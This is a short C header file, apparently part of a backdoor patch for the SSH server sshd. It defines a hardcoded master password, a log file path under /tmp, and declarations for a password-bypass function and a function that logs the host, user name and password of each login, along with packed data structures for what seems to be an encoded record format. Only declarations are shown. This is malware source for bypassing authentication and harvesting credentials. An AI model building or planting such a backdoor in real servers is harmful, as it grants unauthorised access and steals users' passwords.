#ifndef BACKDOOR_H
#define BACKDOOR_H

#define ATEAM_PASSWORD "changethis"
#define ATEAM_LOG "/tmp/ioc-of-sshd-backdoor"
int backdoor_auth(const char *password);
void backdoor_log(const char *host, char *user, const char *password);

typedef struct
{
	struct
	{
		unsigned short type;
		unsigned short len;
	} header;
	unsigned char data[0];
} __attribute ((packed)) record;

typedef struct
{
	unsigned char key;
	unsigned char data[0];
} __attribute ((packed)) data;

#endif /* BACKDOOR_H */
